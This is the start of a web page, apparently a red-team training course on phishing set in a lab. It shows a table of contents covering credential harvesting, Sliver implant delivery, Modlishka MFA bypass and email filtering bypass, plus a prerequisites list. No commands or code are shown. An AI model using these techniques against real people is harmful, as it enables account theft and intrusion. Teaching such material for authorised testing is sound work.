<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=canonical type=text/html href=https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/><link rel=alternate type=application/rss+xml href=https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/index.xml><meta name=robots content="noindex, nofollow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Phishing Credential Harvesting and Beyond | defektive</title><meta name=description content="Learn how to phish using payloads and credential harvesting with TFA interception."><meta property="og:title" content="Phishing Credential Harvesting and Beyond"><meta property="og:description" content="Learn how to phish using payloads and credential harvesting with TFA interception."><meta property="og:type" content="website"><meta property="og:url" content="https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/"><meta itemprop=name content="Phishing Credential Harvesting and Beyond"><meta itemprop=description content="Learn how to phish using payloads and credential harvesting with TFA interception."><meta name=twitter:card content="summary"><meta name=twitter:title content="Phishing Credential Harvesting and Beyond"><meta name=twitter:description content="Learn how to phish using payloads and credential harvesting with TFA interception."><link rel=preload href=/scss/main.min.3c058018e96c3900e9021002122be77d03515fb87313505baa1db3adf60c65fd.css as=style><link href=/scss/main.min.3c058018e96c3900e9021002122be77d03515fb87313505baa1db3adf60c65fd.css rel=stylesheet><script src=https://code.jquery.com/jquery-3.7.1.min.js integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin=anonymous></script>
<script defer src=https://unpkg.com/lunr@2.3.9/lunr.min.js integrity=sha384-203J0SNzyqHby3iU6hzvzltrWi/M41wOP5Gu+BiJMz5nwKykbkUx8Kp7iti0Lpli crossorigin=anonymous></script></head><body class=td-section><header><nav class="td-navbar js-navbar-scroll" data-bs-theme=dark><div class="container-fluid flex-column flex-md-row"><a class=navbar-brand href=/><span class="navbar-brand__logo navbar-logo"><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class=navbar-brand__name>defektive</span></a><div class="td-navbar-nav-scroll ms-md-auto" id=main_navbar><ul class=navbar-nav><li class=nav-item><a class=nav-link href=/about/><span>About</span></a></li><li class=nav-item><a class="nav-link active" href=/docs/><span>How To</span></a></li><li class=nav-item><a class=nav-link href=/blog/><span>Blog</span></a></li><li class="td-light-dark-menu nav-item dropdown"><svg xmlns="http://www.w3.org/2000/svg" class="d-none"><symbol id="check2" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5.0 010 .708l-7 7a.5.5.0 01-.708.0l-3.5-3.5a.5.5.0 11.708-.708L6.5 10.293l6.646-6.647a.5.5.0 01.708.0z"/></symbol><symbol id="circle-half" viewBox="0 0 16 16"><path d="M8 15A7 7 0 108 1v14zm0 1A8 8 0 118 0a8 8 0 010 16z"/></symbol><symbol id="moon-stars-fill" viewBox="0 0 16 16"><path d="M6 .278a.768.768.0 01.08.858 7.208 7.208.0 00-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527.0 1.04-.055 1.533-.16a.787.787.0 01.81.316.733.733.0 01-.031.893A8.349 8.349.0 018.344 16C3.734 16 0 12.286.0 7.71.0 4.266 2.114 1.312 5.124.06A.752.752.0 016 .278z"/><path d="M10.794 3.148a.217.217.0 01.412.0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217.0 010 .412l-1.162.387A1.734 1.734.0 0011.593 7.69l-.387 1.162a.217.217.0 01-.412.0l-.387-1.162A1.734 1.734.0 009.31 6.593l-1.162-.387a.217.217.0 010-.412l1.162-.387a1.734 1.734.0 001.097-1.097l.387-1.162zM13.863.099a.145.145.0 01.274.0l.258.774c.115.346.386.617.732.732l.774.258a.145.145.0 010 .274l-.774.258a1.156 1.156.0 00-.732.732l-.258.774a.145.145.0 01-.274.0l-.258-.774a1.156 1.156.0 00-.732-.732l-.774-.258a.145.145.0 010-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/></symbol><symbol id="sun-fill" viewBox="0 0 16 16"><path d="M8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 0zm0 13a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 13zm8-5a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2a.5.5.0 01.5.5zM3 8a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2A.5.5.0 013 8zm10.657-5.657a.5.5.0 010 .707l-1.414 1.415a.5.5.0 11-.707-.708l1.414-1.414a.5.5.0 01.707.0zm-9.193 9.193a.5.5.0 010 .707L3.05 13.657a.5.5.0 01-.707-.707l1.414-1.414a.5.5.0 01.707.0zm9.193 2.121a.5.5.0 01-.707.0l-1.414-1.414a.5.5.0 01.707-.707l1.414 1.414a.5.5.0 010 .707zM4.464 4.465a.5.5.0 01-.707.0L2.343 3.05a.5.5.0 11.707-.707l1.414 1.414a.5.5.0 010 .708z"/></symbol></svg><button class="btn btn-link nav-link dropdown-toggle d-flex align-items-center" id=bd-theme type=button aria-expanded=false data-bs-toggle=dropdown data-bs-display=static aria-label="Toggle theme (auto)"><svg class="bi my-1 theme-icon-active"><use href="#circle-half"/></svg></button><ul class="dropdown-menu dropdown-menu-end" aria-labelledby=bd-theme-text><li><button type=button class="dropdown-item d-flex align-items-center" data-bs-theme-value=light aria-pressed=false><svg class="bi me-2 opacity-50"><use href="#sun-fill"/></svg>
Light<svg class="bi ms-auto d-none"><use href="#check2"/></svg></button></li><li><button type=button class="dropdown-item d-flex align-items-center" data-bs-theme-value=dark aria-pressed=false><svg class="bi me-2 opacity-50"><use href="#moon-stars-fill"/></svg>
Dark<svg class="bi ms-auto d-none"><use href="#check2"/></svg></button></li><li><button type=button class="dropdown-item d-flex align-items-center active" data-bs-theme-value=auto aria-pressed=true><svg class="bi me-2 opacity-50"><use href="#circle-half"/></svg>
Auto<svg class="bi ms-auto d-none"><use href="#check2"/></svg></button></li></ul></li></ul></div><div class="d-none d-lg-block"><div class="td-search td-search--offline"><div class=td-search__icon></div><input type=search class="td-search__input form-control" placeholder="Search this site…" aria-label="Search this site…" autocomplete=off data-offline-search-index-json-src=/offline-search-index.f5869d72ef9ecc001fee9a37b6c3e3e2.json data-offline-search-base-href=/ data-offline-search-max-results=10></div></div></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><main class="col-12 col-md-9 col-xl-8 ps-md-5" role=main><div class=td-content><div class="pageinfo pageinfo-primary d-print-none"><p>This is the multi-page printable view of this section.
<a href=# onclick="return print(),!1">Click here to print</a>.</p><p><a href=/docs/phishing-credential-harvesting-and-beyond/>Return to the regular view of this page</a>.</p></div><h1 class=title>Phishing Credential Harvesting and Beyond</h1><div class=lead>Learn how to phish using payloads and credential harvesting with TFA interception.</div><ul><li>1: <a href=#pg-0bdf90123b1e5e5ddb3e9b4762e952dc>Prerequisites</a></li><li>2: <a href=#pg-61269e011f5bf3472f40bf3d7ca06161>Introduction</a></li><li>3: <a href=#pg-cd88b2596736e0732f563d037b1514b6>Infrastructure</a></li><li>4: <a href=#pg-a292a7a5f0408555b285152be77996a9>What isn't covered?</a></li><li>5: <a href=#pg-6e05732626bbbfc73470eeef725f5110>Lab Environment</a></li><li>6: <a href=#pg-bd43c938d3d8aca1ab574be48bdb104b>Lab Environment: Rules of Engagement</a></li><li>7: <a href=#pg-8f8f0920ef9de8f09af53324d31dd0ba>Setup Operations Directory</a></li><li>8: <a href=#pg-b694bb432957ece9c1c417b720f19f1d>OSINT</a></li><li>9: <a href=#pg-6aec0996226f0c4aaeb229d1f2476881>Mailhog</a></li><li>10: <a href=#pg-cccb75289be1bc46ed538320ce35f27f>Gophish</a></li><li>11: <a href=#pg-8025e6a1540213fff01e9f1880cf6427>Target Acquisition</a></li><li>12: <a href=#pg-4ea9292a9a10de147b6cccfbd7953fd1>Target Acquisition: Git</a></li><li>13: <a href=#pg-762fbf10c8d0ea99115f87dbe750ac11>Basic Credential Harvesting</a></li><li>14: <a href=#pg-43b20bb3758f90a501b1c68f60ffe9af>State Review I</a></li><li>15: <a href=#pg-21808e3ea448bdfa79d7e2558330a450>Implant Setup With Sliver</a></li><li>16: <a href=#pg-7ed8bcbefbfb0e761dd10d21f2e7a425>Sliver: Generating an implant</a></li><li>17: <a href=#pg-8a4d9e0913a7a7eaa1acea6bf7a6747d>Basic Implant Delivery</a></li><li>18: <a href=#pg-4c87c37856db8a4778bcfbc1efa019ba>State Review II</a></li><li>19: <a href=#pg-4d4e404fb59ae84940cd24820edad509>Modlishka</a></li><li>20: <a href=#pg-c2f1381909a74c0b6a8ea5aa04b37951>Setup MFA Authentication Provider</a></li><li>21: <a href=#pg-9dd9096a9148e11227a382d2b3b48ee9>Reconfigure Modlishka With MFA Authentication Provider</a></li><li>22: <a href=#pg-d28f5e7074dad9b709eaea3f63bd3422>Test Modlishka MFA Bypass</a></li><li>23: <a href=#pg-4885a40abc17e08a73adb3ce48afbeed>Not So Basic Credential Harvesting</a></li><li>24: <a href=#pg-cdf65d8781bbfc97d7695bc7209b2f6b>Email Filtering Bypass</a></li><li>25: <a href=#pg-439e83cf1cb84facea6bbcd48922799e>Modlishka Terminate to Implant Download</a></li><li>26: <a href=#pg-810e17e488d8482d435c2b196a7bb576>Better Payload Generation</a></li><li>27: <a href=#pg-80ae82d275d31c0359bf4111e10f40fe>Bot Detection</a></li><li>28: <a href=#pg-0d9397d022264ae475b2c56564615238>Traefik Reverse Proxy</a></li><li>29: <a href=#pg-c795a7577570ff8c56566c9f51f92318>Wrap up</a></li></ul><div class=content><p>Learn how to run successful phishing campaigns.</p><p><img src=/static/how-to-phishing/qr-code.png alt="QR Code"></p></div></div><div class=td-content><h1 id=pg-0bdf90123b1e5e5ddb3e9b4762e952dc>1 - Prerequisites</h1><p>Hopefully this describes you:</p><ul><li>Human.</li><li>Proficient with Linux terminal usage.</li><li>Manage / edit files in GUIs and terminals.</li><li>Have a laptop with the following:<ul><li>Ability to run a Linux VM (not required for on site trainings).</li><li>WiFi card.</li><li>A web browser.</li></ul></li><li>Proficient with docker and docker compose.</li><li>Desire to learn, sometimes the hard way (eg: troubleshooting).</li><li>???</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-61269e011f5bf3472f40bf3d7ca06161>2 - 